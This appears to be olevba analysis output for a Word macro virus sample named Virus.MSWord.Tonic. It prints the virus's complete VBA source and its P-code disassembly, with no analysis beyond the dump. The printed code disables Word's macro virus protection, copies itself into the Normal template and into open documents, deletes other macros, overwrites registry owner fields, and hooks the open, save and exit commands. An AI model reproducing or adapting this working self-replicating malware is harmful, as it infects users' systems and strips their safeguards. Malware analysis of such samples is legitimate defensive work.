olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Tonic
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Tonic - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'>>-- J1nt0 -->
'@;-'-  I miss U  ;-)
-------------------------------------------------------------------------------
VBA MACRO Pand4.bas 
in file: ./Virus.MSWord.Tonic - OLE stream: 'Macros/VBA/Pand4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function Pemakai()
With Application
    .UserName = "J1nt0"
    .UserInitials = "J1n"
    .UserAddress = "STM133PDG"
End With
End Function
Function CekMacro()
On Error Resume Next
    Application.ShowVisualBasicEditor = False
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    
    If NT.Lines(1, 1) <> "'>>-- J1nt0 -->" Then
    NT.DeleteLines 1, NT.CountOfLines
    NT.InsertLines 1, "'>>-- J1nt0 -->" & Chr(13) & _
                      "'@;-'-  I miss U  ;-)"
    End If

If AD.Lines(1, 1) <> "'>>-- J1nt0 -->" Then
AD.DeleteLines 1, AD.CountOfLines
AD.InsertLines 1, "'>>-- J1nt0 -->" & Chr(13) & _
                  "'@;-'-  I miss U  ;-)"
End If
    If ActiveDocument.VBProject.Name <> "J1nt0" Then
    ActiveDocument.VBProject.Name = "J1nt0"
    End If

Dim Doc As Boolean
Doc = False
    For Each Acd In ActiveDocument.VBProject.VBComponents
    If Acd.Name = "Pand4" And Acd.Name = "P4nd4" Then Doc = True
        If Acd.Name <> "Pand4" And Acd.Name <> "ThisDocument" And Acd.Name <> "P4nd4" Then
        Application.OrganizerDelete Source:=ActiveDocument.FullName, _
        Name:=Acd.Name, Object:=wdOrganizerObjectProjectItems: Beep
    End If
    Next Acd
    If Doc = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="Pand4", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument, Name:="P4nd4", Object:=wdOrganizerObjectProjectItems
    End If

    Dim Nor As Boolean
    Nor = False
    For Each Ntl In NormalTemplate.VBProject.VBComponents
        If Ntl.Name = "Pand4" And Ntl.Name = "P4nd4" Then Nor = True
        If Ntl.Name <> "P4nd4" And Ntl.Name <> "Pand4" And Ntl.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Ntl.Name, Object:=wdOrganizerObjectProjectItems: Beep
        End If
    Next Ntl
    If Nor = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="Pand4", Object:=wdOrganizerObjectProjectItems
          Application.OrganizerCopy Source:=ActiveDocument.FullName, _
          Destination:=NormalTemplate.FullName, Name:="P4nd4", Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
        Pemakai
    End If
End Function
Function Protect()
With Options
     .VirusProtection = False
     .SaveNormalPrompt = False
     .ConfirmConversions = False
End With
End Function
Sub FileOpen()
On Error GoTo Salah
   Protect
WT
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
    PandA
    ActiveDocument.Save
    End If
Salah:
End Sub
Sub AutoOpen()
On Error GoTo Salah
WT
   PandA
   ActiveDocument.Save
Salah:
End Sub
Sub AutoClose()
On Error GoTo Salah
  If ActiveDocument.Path <> "" And Left(ActiveDocument = "Document", 8) Then
  PandA
  ActiveDocument.Save
  End If
Salah:
End Sub
Sub FileClose()
AutoClose
ActiveDocument.Close
End Sub
Sub FileSave()
On Error GoTo Salah
  PandA
   If ActiveDocument.Saved = False Then ActiveDocument.Save
Salah:
End Sub
Function CekRegistri()
On Error GoTo Salah
Dim Src

If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") <> "PandA" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "PandA"
  System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "J1nt0 Here Now !, Sorry"
End If

Salah:
End Function
Sub ViewVbCode()
On Error Resume Next
SendKeys "%m%s{down}~%d 'Maaf yg merasa terganggu !?, By J1nt0.PD"
End Sub
Sub ToolsMacro()
  ViewVbCode
End Sub
Sub PandA()
Attribute PandA.VB_Description = "Macro created 15/01/00 by  Jun1aNT0.TK97"
On Error GoTo Gagal
Protect
CekRegistri
CekMacro
Gagal:
End Sub
Sub BukaEditor()
Dim Pesan
On Error Resume Next
Pesan = InputBox("Password Anda ...!?")
    If Pesan = "TK97" Then
    Application.ShowVisualBasicEditor = True
        Else
        MsgBox "Password anda salah", vbCritical + vbOKOnly, "Error"
        Application.Quit
        End If
End Sub
Sub FileTemplates()
  Dialogs(87).Display
End Sub
Function WT()
WordBasic.DisableAutoMacros True
End Function
Function WF()
WordBasic.DisableAutoMacros False
End Function
Sub FileExit()
On Error GoTo Gagal
WF
If Documents.Count <> 0 Then
 For i = 1 To Documents.Count
  Documents(i).Close
 Next i
End If
If Dir(Application.StartupPath) <> "Jin.dot" And Dir(Application.StartupPath) <> "Jin.src" Then
Application.Visible = False
Documents.Add
    With ActiveDocument
        .SaveAs FileName:=Application.StartupPath & "\Jin.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Application.StartupPath & "\Jin.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If

If Day(Now) = 28 Or Day(Now) = 12 Then
 P4nd4.Show
End If
WT
Application.Quit
Gagal:
WT
Application.Quit
End Sub
Sub AutoExit()
FileExit
End Sub
Sub AutoExec()
Attribute AutoExec.VB_Description = "For Some1.Isd, @;-'-  You will always in my heart "
On Error GoTo Salah
  Protect
  WordBasic.DisableAutoMacros True
  PandA
Salah:
'Assalamualaikum, Numpang lewat nih ...!
'Maaf buat Rekan-rekan yang merasa terganggu dengan keberadaan macro ini
End Sub
-------------------------------------------------------------------------------
VBA MACRO P4nd4.frm 
in file: ./Virus.MSWord.Tonic - OLE stream: 'Macros/VBA/P4nd4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 













































































Private Sub Label1_Click()
Love.Top = (Application.Height - 50)
Love.Left = 5
Love.Caption = "For some1 I Love U"
End Sub

Private Sub UserForm_Activate()
Application.Visible = False
BMP = Application.System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Desktop", "Wallpaper")
Me.Picture = LoadPicture(BMP)
Me.Top = 0: Me.Left = 0
Me.Width = Application.Width - 5
Me.Height = Application.Height

Nama = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner")
If Nama <> "" Then
Me.Caption = "Thanx to " & Nama
End If

If Day(Now) = 12 Then
L2.Caption = "This is my day, Happy birthday ..."
ElseIf Day(Now) = 28 Then
L2.Caption = "This is our day, Let's Party ..."

End If
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
Application.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Tonic
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1028 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000E ">>-- J1nt0 -->"
' Line #1:
' 	QuoteRem 0x0000 0x0014 "@;-'-  I miss U  ;-)"
' Macros/VBA/Pand4 - 10161 bytes
' Line #0:
' 	FuncDefn (Function Pemakai())
' Line #1:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #2:
' 	LitStr 0x0005 "J1nt0"
' 	MemStWith UserName 
' Line #3:
' 	LitStr 0x0003 "J1n"
' 	MemStWith UserInitials 
' Line #4:
' 	LitStr 0x0009 "STM133PDG"
' 	MemStWith UserAddress 
' Line #5:
' 	EndWith 
' Line #6:
' 	EndFunc 
' Line #7:
' 	FuncDefn (Function CekMacro())
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #12:
' Line #13:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000F "'>>-- J1nt0 -->"
' 	Ne 
' 	IfBlock 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #15:
' 	LineCont 0x0004 0C 00 16 00
' 	LitDI2 0x0001 
' 	LitStr 0x000F "'>>-- J1nt0 -->"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0015 "'@;-'-  I miss U  ;-)"
' 	Concat 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #16:
' 	EndIfBlock 
' Line #17:
' Line #18:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000F "'>>-- J1nt0 -->"
' 	Ne 
' 	IfBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #20:
' 	LineCont 0x0004 0C 00 12 00
' 	LitDI2 0x0001 
' 	LitStr 0x000F "'>>-- J1nt0 -->"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0015 "'@;-'-  I miss U  ;-)"
' 	Concat 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0005 "J1nt0"
' 	Ne 
' 	IfBlock 
' Line #23:
' 	LitStr 0x0005 "J1nt0"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #24:
' 	EndIfBlock 
' Line #25:
' Line #26:
' 	Dim 
' 	VarDefn Doc (As Boolean)
' Line #27:
' 	LitVarSpecial (False)
' 	St Doc 
' Line #28:
' 	StartForVariable 
' 	Ld Acd 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #29:
' 	Ld Acd 
' 	MemLd New 
' 	LitStr 0x0005 "Pand4"
' 	Eq 
' 	Ld Acd 
' 	MemLd New 
' 	LitStr 0x0005 "P4nd4"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Doc 
' 	EndIf 
' Line #30:
' 	Ld Acd 
' 	MemLd New 
' 	LitStr 0x0005 "Pand4"
' 	Ne 
' 	Ld Acd 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	Ld Acd 
' 	MemLd New 
' 	LitStr 0x0005 "P4nd4"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #31:
' 	LineCont 0x0004 09 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Acd 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	BoS 0x0000 
' 	ArgsCall Beep 0x0000 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	StartForVariable 
' 	Ld Acd 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	Ld Doc 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #35:
' 	LineCont 0x0004 09 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Pand4"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #36:
' 	LineCont 0x0004 09 00 04 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "P4nd4"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	Dim 
' 	VarDefn Nor (As Boolean)
' Line #40:
' 	LitVarSpecial (False)
' 	St Nor 
' Line #41:
' 	StartForVariable 
' 	Ld Ntl 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #42:
' 	Ld Ntl 
' 	MemLd New 
' 	LitStr 0x0005 "Pand4"
' 	Eq 
' 	Ld Ntl 
' 	MemLd New 
' 	LitStr 0x0005 "P4nd4"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Nor 
' 	EndIf 
' Line #43:
' 	Ld Ntl 
' 	MemLd New 
' 	LitStr 0x0005 "P4nd4"
' 	Ne 
' 	Ld Ntl 
' 	MemLd New 
' 	LitStr 0x0005 "Pand4"
' 	Ne 
' 	And 
' 	Ld Ntl 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #44:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Ntl 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	BoS 0x0000 
' 	ArgsCall Beep 0x0000 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld Ntl 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	Ld Nor 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #48:
' 	LineCont 0x0004 09 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Pand4"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #49:
' 	LineCont 0x0004 09 00 0A 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "P4nd4"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #50:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #51:
' 	ArgsCall Pemakai 0x0000 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	EndFunc 
' Line #54:
' 	FuncDefn (Function Protect())
' Line #55:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #56:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #57:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #58:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #59:
' 	EndWith 
' Line #60:
' 	EndFunc 
' Line #61:
' 	FuncDefn (Sub FileOpen())
' Line #62:
' 	OnError Salah 
' Line #63:
' 	ArgsCall Protect 0x0000 
' Line #64:
' 	ArgsCall WT 0x0000 
' Line #65:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #66:
' 	ArgsCall PandA 0x0000 
' Line #67:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	Label Salah 
' Line #70:
' 	EndSub 
' Line #71:
' 	FuncDefn (Sub AutoOpen())
' Line #72:
' 	OnError Salah 
' Line #73:
' 	ArgsCall WT 0x0000 
' Line #74:
' 	ArgsCall PandA 0x0000 
' Line #75:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #76:
' 	Label Salah 
' Line #77:
' 	EndSub 
' Line #78:
' 	FuncDefn (Sub AutoClose())
' Line #79:
' 	OnError Salah 
' Line #80:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld ActiveDocument 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	And 
' 	IfBlock 
' Line #81:
' 	ArgsCall PandA 0x0000 
' Line #82:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	Label Salah 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Sub FileClose())
' Line #87:
' 	ArgsCall AutoClose 0x0000 
' Line #88:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Sub FileSave())
' Line #91:
' 	OnError Salah 
' Line #92:
' 	ArgsCall PandA 0x0000 
' Line #93:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #94:
' 	Label Salah 
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Function CekRegistri())
' Line #97:
' 	OnError Salah 
' Line #98:
' 	Dim 
' 	VarDefn Src
' Line #99:
' Line #100:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0005 "PandA"
' 	Ne 
' 	IfBlock 
' Line #101:
' 	LitStr 0x0005 "PandA"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #102:
' 	LitStr 0x0017 "J1nt0 Here Now !, Sorry"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #103:
' 	EndIfBlock 
' Line #104:
' Line #105:
' 	Label Salah 
' Line #106:
' 	EndFunc 
' Line #107:
' 	FuncDefn (Sub ViewVbCode())
' Line #108:
' 	OnError (Resume Next) 
' Line #109:
' 	LitStr 0x0037 "%m%s{down}~%d 'Maaf yg merasa terganggu !?, By J1nt0.PD"
' 	ArgsCall SendKeys 0x0001 
' Line #110:
' 	EndSub 
' Line #111:
' 	FuncDefn (Sub ToolsMacro())
' Line #112:
' 	ArgsCall ViewVbCode 0x0000 
' Line #113:
' 	EndSub 
' Line #114:
' 	FuncDefn (Sub PandA())
' Line #115:
' 	OnError Gagal 
' Line #116:
' 	ArgsCall Protect 0x0000 
' Line #117:
' 	ArgsCall CekRegistri 0x0000 
' Line #118:
' 	ArgsCall CekMacro 0x0000 
' Line #119:
' 	Label Gagal 
' Line #120:
' 	EndSub 
' Line #121:
' 	FuncDefn (Sub BukaEditor())
' Line #122:
' 	Dim 
' 	VarDefn Pesan
' Line #123:
' 	OnError (Resume Next) 
' Line #124:
' 	LitStr 0x0013 "Password Anda ...!?"
' 	ArgsLd InputBox 0x0001 
' 	St Pesan 
' Line #125:
' 	Ld Pesan 
' 	LitStr 0x0004 "TK97"
' 	Eq 
' 	IfBlock 
' Line #126:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #127:
' 	ElseBlock 
' Line #128:
' 	LitStr 0x0013 "Password anda salah"
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0005 "Error"
' 	ArgsCall MsgBox 0x0003 
' Line #129:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	EndSub 
' Line #132:
' 	FuncDefn (Sub FileTemplates())
' Line #133:
' 	LitDI2 0x0057 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #134:
' 	EndSub 
' Line #135:
' 	FuncDefn (Function WT())
' Line #136:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #137:
' 	EndFunc 
' Line #138:
' 	FuncDefn (Function WF())
' Line #139:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #140:
' 	EndFunc 
' Line #141:
' 	FuncDefn (Sub FileExit())
' Line #142:
' 	OnError Gagal 
' Line #143:
' 	ArgsCall WF 0x0000 
' Line #144:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #145:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #146:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #147:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	Ld Application 
' 	MemLd StartupPath 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0007 "Jin.dot"
' 	Ne 
' 	Ld Application 
' 	MemLd StartupPath 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0007 "Jin.src"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #150:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #151:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #152:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #153:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0008 "\Jin.src"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #154:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0008 "\Jin.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #155:
' 	EndWith 
' Line #156:
' 	EndIfBlock 
' Line #157:
' Line #158:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001C 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #159:
' 	Ld P4nd4 
' 	ArgsMemCall Show 0x0000 
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	ArgsCall WT 0x0000 
' Line #162:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #163:
' 	Label Gagal 
' Line #164:
' 	ArgsCall WT 0x0000 
' Line #165:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #166:
' 	EndSub 
' Line #167:
' 	FuncDefn (Sub AutoExit())
' Line #168:
' 	ArgsCall FileExit 0x0000 
' Line #169:
' 	EndSub 
' Line #170:
' 	FuncDefn (Sub AutoExec())
' Line #171:
' 	OnError Salah 
' Line #172:
' 	ArgsCall Protect 0x0000 
' Line #173:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #174:
' 	ArgsCall PandA 0x0000 
' Line #175:
' 	Label Salah 
' Line #176:
' 	QuoteRem 0x0000 0x0027 "Assalamualaikum, Numpang lewat nih ...!"
' Line #177:
' 	QuoteRem 0x0000 0x0047 "Maaf buat Rekan-rekan yang merasa terganggu dengan keberadaan macro ini"
' Line #178:
' 	EndSub 
' Macros/VBA/P4nd4 - 3876 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' 	FuncDefn (Private Sub Label1_Click())
' Line #78:
' 	Ld Application 
' 	MemLd Height 
' 	LitDI2 0x0032 
' 	Sub 
' 	Paren 
' 	Ld Love 
' 	MemSt Top 
' Line #79:
' 	LitDI2 0x0005 
' 	Ld Love 
' 	MemSt LBound 
' Line #80:
' 	LitStr 0x0012 "For some1 I Love U"
' 	Ld Love 
' 	MemSt Caption 
' Line #81:
' 	EndSub 
' Line #82:
' Line #83:
' 	FuncDefn (Private Sub UserForm_Activate())
' Line #84:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #85:
' 	LitStr 0x0000 ""
' 	LitStr 0x0029 "HKEY_USERS\.DEFAULT\Control Panel\Desktop"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld Application 
' 	MemLd System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St BMP 
' Line #86:
' 	Ld BMP 
' 	ArgsLd LoadPicture 0x0001 
' 	Ld id_FFFF 
' 	MemSt Picture 
' Line #87:
' 	LitDI2 0x0000 
' 	Ld id_FFFF 
' 	MemSt Top 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld id_FFFF 
' 	MemSt LBound 
' Line #88:
' 	Ld Application 
' 	MemLd With 
' 	LitDI2 0x0005 
' 	Sub 
' 	Ld id_FFFF 
' 	MemSt With 
' Line #89:
' 	Ld Application 
' 	MemLd Height 
' 	Ld id_FFFF 
' 	MemSt Height 
' Line #90:
' Line #91:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Nama 
' Line #92:
' 	Ld Nama 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #93:
' 	LitStr 0x0009 "Thanx to "
' 	Ld Nama 
' 	Concat 
' 	Ld id_FFFF 
' 	MemSt Caption 
' Line #94:
' 	EndIfBlock 
' Line #95:
' Line #96:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	IfBlock 
' Line #97:
' 	LitStr 0x0022 "This is my day, Happy birthday ..."
' 	Ld L2 
' 	MemSt Caption 
' Line #98:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001C 
' 	Eq 
' 	ElseIfBlock 
' Line #99:
' 	LitStr 0x0020 "This is our day, Let's Party ..."
' 	Ld L2 
' 	MemSt Caption 
' Line #100:
' Line #101:
' 	EndIfBlock 
' Line #102:
' 	EndSub 
' Line #103:
' Line #104:
' 	FuncDefn (Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer))
' Line #105:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #106:
' 	EndSub 
